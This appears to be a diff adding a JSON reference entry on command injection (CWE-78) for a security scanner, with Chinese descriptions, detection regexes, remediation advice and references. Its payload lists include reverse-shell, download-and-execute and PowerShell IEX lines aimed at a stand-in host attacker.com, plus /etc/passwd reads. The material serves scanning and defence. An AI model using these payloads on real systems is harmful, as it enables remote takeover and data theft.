@@ -1,0 +1,87 @@
+{
+    "command_injection": {
+        "name": "命令注入",
+        "cwe_id": "CWE-78",
+        "cvss_base_score": 9.8,
+        "description": "命令注入漏洞允许攻击者在服务器上执行任意系统命令",
+        "impact": "远程代码执行、服务器完全控制、数据泄露、横向移动",
+        "payloads": {
+            "linux": [
+                "; id",
+                "| id",
+                "|| id",
+                "&& id",
+                "$(id)",
+                "`id`",
+                "; whoami",
+                "| whoami",
+                "; cat /etc/passwd",
+                "| cat /etc/passwd",
+                "; ls -la",
+                "| ls -la",
+                "; nc -e /bin/sh attacker.com 4444",
+                "| nc -e /bin/sh attacker.com 4444",
+                "; bash -i >& /dev/tcp/attacker.com/4444 0>&1",
+                "$(curl attacker.com/shell.sh | bash)",
+                "`curl attacker.com/shell.sh | bash`",
+                "; wget http://attacker.com/malware -O /tmp/m && chmod +x /tmp/m && /tmp/m"
+            ],
+            "windows": [
+                "& whoami",
+                "| whoami",
+                "&& whoami",
+                "|| whoami",
+                "& dir",
+                "| dir",
+                "& type C:\\Windows\\win.ini",
+                "| type C:\\Windows\\win.ini",
+                "& net user",
+                "| net user",
+                "& powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')\"",
+                "| powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/shell.ps1')\""
+            ],
+            "generic": [
+                "; sleep 5",
+                "| sleep 5",
+                "&& sleep 5",
+                "$(sleep 5)",
+                "`sleep 5`",
+                "| ping -c 10 127.0.0.1",
+                "; ping -c 10 127.0.0.1"
+            ]
+        },
+        "detection_patterns": [
+            "os\\.system\\s*\\(.*\\+.*\\)",
+            "os\\.system\\s*\\(.*%.*\\)",
+            "os\\.popen\\s*\\(.*\\+.*\\)",
+            "subprocess\\.call\\s*\\(.*shell\\s*=\\s*True.*\\)",
+            "subprocess\\.run\\s*\\(.*shell\\s*=\\s*True.*\\)",
+            "subprocess\\.Popen\\s*\\(.*shell\\s*=\\s*True.*\\)",
+            "subprocess\\.check_output\\s*\\(.*shell\\s*=\\s*True.*\\)",
+            "commands\\.getoutput\\s*\\(.*\\+.*\\)",
+            "commands\\.getstatusoutput\\s*\\(.*\\+.*\\)",
+            "exec\\s*\\(.*\\)",
+            "eval\\s*\\(.*\\)"
+        ],
+        "safe_patterns": [
+            "subprocess\\.run\\s*\\(.*shell\\s*=\\s*False.*\\)",
+            "subprocess\\.run\\s*\\(\\[.*\\]",
+            "subprocess\\.Popen\\s*\\(\\[.*\\]",
+            "shlex\\.split\\s*\\(.*\\)"
+        ],
+        "remediation": [
+            "避免使用shell=True参数",
+            "使用列表形式传递命令参数",
+            "对用户输入进行严格白名单验证",
+            "使用shlex.quote()转义shell参数",
+            "使用专门的库代替系统命令(如用Python库代替shell命令)",
+            "限制应用程序权限",
+            "使用容器化隔离"
+        ],
+        "references": [
+            "https://owasp.org/www-community/attacks/Command_Injection",
+            "https://cwe.mitre.org/data/definitions/78.html",
+            "https://portswigger.net/web-security/os-command-injection"
+        ]
+    }
+}
